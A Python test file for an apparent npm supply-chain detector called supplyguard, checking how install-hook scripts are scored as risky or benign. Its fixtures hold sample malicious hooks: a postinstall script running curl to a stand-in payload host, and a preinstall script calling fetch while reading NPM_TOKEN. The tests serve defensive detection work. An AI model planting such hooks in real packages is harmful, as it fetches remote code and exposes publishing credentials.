import json

from supplyguard.evaluation.lifecycle_signals import (
    enrich_lifecycle_context,
    lifecycle_candidate_signals,
    lifecycle_context,
)


def test_lifecycle_context_reads_hook_command_and_target_file(tmp_path):
    package = tmp_path / "pkg"
    package.mkdir()
    (package / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "node setup.js"}}),
        encoding="utf-8",
    )
    (package / "setup.js").write_text(
        "const cp = require('child_process');\n"
        "cp.exec('curl https://example.test/payload');\n",
        encoding="utf-8",
    )

    context = lifecycle_context({"package_path": str(package)})

    assert context["hook_commands"] == {"postinstall": "node setup.js"}
    assert context["hook_targets"] == ["setup.js"]
    assert context["hook_target_files_found"] == ["setup.js"]
    assert context["hook_has_network"] is True
    assert context["hook_has_shell_exec"] is True
    assert context["hook_risk_score"] == 2


def test_lifecycle_context_marks_common_build_hook(tmp_path):
    package = tmp_path / "pkg"
    package.mkdir()
    (package / "package.json").write_text(
        json.dumps({"scripts": {"install": "node-gyp rebuild"}}),
        encoding="utf-8",
    )

    context = lifecycle_context({"package_path": str(package)})

    assert context["hook_has_benign_build_terms"] is True
    assert context["hook_risk_score"] == 0


def test_lifecycle_confirm_candidate_matches_mid_gnn_risky_hook(tmp_path):
    package = tmp_path / "pkg"
    package.mkdir()
    (package / "package.json").write_text(
        json.dumps(
            {
                "scripts": {"preinstall": "node install.js"},
                "description": "short",
            }
        ),
        encoding="utf-8",
    )
    (package / "install.js").write_text(
        "fetch('https://example.test/a'); process.env.NPM_TOKEN;",
        encoding="utf-8",
    )
    record = enrich_lifecycle_context(
        {
            "package_path": str(package),
            "package_name": "demo",
            "true_label": 1,
            "hybrid_verdict": "suspicious",
            "gnn_score": 0.52,
            "metadata_risk": 0.2,
            "rules_matched": ["MED_INSTALL_HOOK_EXISTS"],
        }
    )
    candidates = {candidate.name: candidate for candidate in lifecycle_candidate_signals()}

    assert candidates["confirm_mid_gnn_hook_risk_score_ge2"].predicate(record) is True
    assert (
        candidates["confirm_mid_gnn_hook_risk_score_ge1_no_build"].predicate(record)
        is True
    )


def test_lifecycle_suppress_candidate_matches_low_risk_build_hook(tmp_path):
    package = tmp_path / "pkg"
    package.mkdir()
    (package / "package.json").write_text(
        json.dumps({"scripts": {"install": "prebuild-install || node-gyp rebuild"}}),
        encoding="utf-8",
    )
    record = enrich_lifecycle_context(
        {
            "package_path": str(package),
            "package_name": "native-addon",
            "true_label": 0,
            "hybrid_verdict": "malicious",
            "gnn_score": 0.61,
            "metadata_risk": 0.0,
            "rules_matched": ["MED_INSTALL_HOOK_EXISTS"],
        }
    )
    candidates = {candidate.name: candidate for candidate in lifecycle_candidate_signals()}

    assert candidates["suppress_hook_build_context_low_metadata"].predicate(record) is True
